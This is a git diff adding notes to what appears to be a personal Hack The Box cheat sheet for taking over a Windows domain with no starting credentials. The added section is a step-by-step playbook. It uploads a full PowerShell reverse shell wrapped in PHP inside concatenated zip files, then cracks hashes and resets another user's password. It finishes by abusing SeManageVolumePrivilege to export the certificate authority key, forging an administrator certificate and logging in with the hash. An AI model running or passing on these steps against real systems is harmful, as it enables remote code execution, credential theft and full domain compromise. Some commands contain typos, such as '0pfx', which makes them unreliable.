@@ -65,7 +65,7 @@ evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'abc@123'
 
 
 ----------------------------------------------------------------------------------------------------------------------
-Bloodhound is a mast!
+Bloodhound is a must!
 
 
 
@@ -96,12 +96,62 @@ faketime '2025-05-27 20:46:00' certipy-ad auth -pfx administrator.pfx -username 
 
 evil-winrm -i targetIP -u administrator -H 'hash' 
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+(NO CREDS WINDOWS MACHINE)
+1. you need good enumeration + create an account at the website:
+   gobuster dir ....... +x php   (windows site usually have .php files)
+   ffuf ...... 
+2. add---> echo '10.10.11.xx name.htb DC01.name.htb' | sudo tee -a /etc/hosts
+3. if you found something like ..../upload.php?s_id=1
+   try fuzzing it with ffuf or burpsuite
+find the right id and there you will find a website that you can upload zip file
 
+4. ZipSlip  (it allows attackers upload a zip file which has a legit file.pdf adn then your malware)
+a) echo "hi" > legit.pdf
+b) zip legit.zip legit.pdf
+c) nano shell.php and put inside this:
+  <?php
+shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('YOURIP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
+?>
 
+and do: zip mal.zip shell.php
+and: cat legit.zip mal.zip > combined.zip
+and upload this zip
 
+d) nc -lvnp 4444
+e) then go where this file has saved, meybe: ..../uploads/shell.php
 
+5. now you have a rce as xamppuser. Try to find usefull files like databases and hashes.
+use type filename
+6. if you find hashes try:
+hashcat -a 0 -m hashid -w /usr/share/wordlists/rockyou.txt
+7. and log in with evilrm to thuis account and then use bloodhound to find the connections
+8. usually you will be able to change a password with:
+net rpc password "targetname" "newP@ssword2022" -U "domainanme.htb"/"yourusername"%"thecodeyoufoundfromhash" -S domainanmeagain.htb        (all this on your machine)
 
+9. and this user will have soem rights. you can check with bloodhound and then try to login with evilrm and try:
+whoami /priv
 
+if you found seManageVolumePrivilege: then you have the rights to manage The file system like C.
+it has the exploit: https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
+you dowenload this .exe file at your pc
+and then you evilrm at the user fro mthis directory and press: upload .....exe
 
+10. now you run it there: .\SeManageVolumeExploit.exe
+
+and this user now has full control over C
+Your target is the Certification authorities CA
+11. certutil -exportPFX my "domainanme-LTD-CA" C:\Users\Public\ca.pfx
+12. go at the download file at \Public ---> cd Public
+
+13. download ca.pfx    ( PFX IS THE TYPE THAT CA ARA STORED)
+14. then at your pc forge a fake administrator.pfx:
+   certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@domainanme.htb' -subject 'CN=Administrator,CN=Users,DC=domainanme,DC=htb' -out forged_admin.pfx
+
+15. and now abuse ceripy to auth this ca with kerberos tgt:
+certipy-ad auth 0pfx forged_admin.pfx -dc-ip 10.10.11.x -username 'administrator' -domain 'domainanme.htb'
+
+16. You are ready to connect with evil-winrm:
+evil-winrm -i 10.10.11.x -u administrator -H'd803303515bf814ac14c5f1702abh866....'
 
 
